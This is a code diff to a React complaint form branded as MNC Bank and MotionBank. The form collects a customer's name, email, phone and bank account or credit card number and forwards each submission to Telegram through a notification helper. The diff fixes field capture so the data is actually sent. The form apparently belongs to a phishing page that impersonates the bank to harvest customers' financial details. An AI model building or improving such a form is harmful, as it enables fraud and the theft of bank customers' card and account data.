@@ -11,7 +11,9 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
-import { Send, MapPin, CheckCircle } from "lucide-react";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Send, MapPin, CheckCircle, AlertTriangle } from "lucide-react";
+import { sendTelegramNotification } from "@/lib/telegram";
 
 function WhatsAppIcon({ className }: { className?: string }) {
   return (
@@ -30,6 +32,7 @@ export function ContactForm() {
   const [submitted, setSubmitted] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitError, setSubmitError] = useState<string | null>(null);
+  const [kategori, setKategori] = useState("");
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -42,9 +45,15 @@ export function ContactForm() {
       email: formData.get("email") as string,
       telepon: formData.get("telepon") as string,
       norek: formData.get("norek") as string || "-",
-      kategori: formData.get("kategori") as string,
+      kategori: kategori || "Lainnya",
       pesan: formData.get("pesan") as string,
     };
+
+    if (!data.nama || !data.email || !data.telepon || !data.pesan) {
+      setSubmitError("Harap isi semua field yang wajib diisi.");
+      setIsSubmitting(false);
+      return;
+    }
 
     const success = await sendTelegramNotification({
       action: "Formulir Pengaduan Dikirim",
@@ -105,6 +114,7 @@ export function ContactForm() {
                         <Label htmlFor="nama">Nama Lengkap</Label>
                         <Input
                           id="nama"
+                          name="nama"
                           placeholder="Masukkan nama lengkap"
                           required
                         />
@@ -113,6 +123,7 @@ export function ContactForm() {
                         <Label htmlFor="email">Email</Label>
                         <Input
                           id="email"
+                          name="email"
                           type="email"
                           placeholder="email@example.com"
                           required
@@ -125,6 +136,7 @@ export function ContactForm() {
                         <Label htmlFor="telepon">Nomor Telepon</Label>
                         <Input
                           id="telepon"
+                          name="telepon"
                           type="tel"
                           placeholder="0812XXXXXXXX"
                           required
@@ -134,6 +146,7 @@ export function ContactForm() {
                         <Label htmlFor="norek">Nomor Rekening/Kartu Kredit (Opsional)</Label>
                         <Input
                           id="norek"
+                          name="norek"
                           placeholder="Contoh: 1234567890"
                         />
                       </div>
@@ -141,30 +154,30 @@ export function ContactForm() {
 
                     <div className="space-y-2">
                       <Label htmlFor="kategori">Kategori Pengaduan</Label>
-                      <Select required>
+                      <Select value={kategori} onValueChange={setKategori} required>
                         <SelectTrigger id="kategori">
                           <SelectValue placeholder="Pilih kategori" />
                         </SelectTrigger>
                         <SelectContent>
-                          <SelectItem value="transaksi">
+                          <SelectItem value="Sanggahan Transaksi">
                             Sanggahan Transaksi
                           </SelectItem>
-                          <SelectItem value="e-banking">
+                          <SelectItem value="Gangguan MotionBank">
                             Gangguan MotionBank
                           </SelectItem>
-                          <SelectItem value="biaya">
+                          <SelectItem value="Kartu Kredit MNC Bank">
                             Kartu Kredit MNC Bank
                           </SelectItem>
-                          <SelectItem value="layanan">
+                          <SelectItem value="Layanan Customer Service">
                             Layanan Customer Service
                           </SelectItem>
-                          <SelectItem value="penagihan">
+                          <SelectItem value="Penagihan">
                             Penagihan
                           </SelectItem>
-                          <SelectItem value="produk">
+                          <SelectItem value="Informasi Produk">
                             Informasi Produk
                           </SelectItem>
-                          <SelectItem value="lainnya">
+                          <SelectItem value="Lainnya">
                             Lainnya
                           </SelectItem>
                         </SelectContent>
@@ -175,18 +188,27 @@ export function ContactForm() {
                       <Label htmlFor="pesan">Detail Pengaduan</Label>
                       <Textarea
                         id="pesan"
+                        name="pesan"
                         placeholder="Jelaskan detail keluhan atau pertanyaan Anda..."
                         rows={5}
                         required
                       />
                     </div>
 
+                    {submitError && (
+                      <Alert variant="destructive">
+                        <AlertTriangle className="h-4 w-4" />
+                        <AlertDescription>{submitError}</AlertDescription>
+                      </Alert>
+                    )}
+
                     <Button
                       type="submit"
+                      disabled={isSubmitting}
                       className="w-full bg-primary text-primary-foreground hover:bg-primary/90 font-semibold"
                     >
                       <Send className="mr-2 h-4 w-4" />
-                      Kirim Pengaduan
+                      {isSubmitting ? "Mengirim..." : "Kirim Pengaduan"}
                     </Button>
                   </form>
                 )}
